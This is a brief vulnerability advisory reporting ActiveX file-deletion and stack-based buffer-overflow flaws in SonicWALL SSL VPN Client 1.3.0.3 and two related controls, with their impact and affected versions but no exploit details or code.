SonicWALL SSL VPN Client is prone to multiple remote vulnerabilities. The issues occur in different ActiveX controls and include arbitrary-file-deletion and multiple stack-based buffer-overflow vulnerabilities.

Attackers can exploit these issues to execute arbitrary code within the context of the affected application and delete arbitrary files on the client's computer. Failed exploit attempts will result in denial-of-service conditions.

These issues affect SonicWALL SSL VPN 1.3.0.3 software as well as WebCacheCleaner 1.3.0.3 and NeLaunchCtrl 2.1.0.49 ActiveX controls; other versions may also be vulnerable.
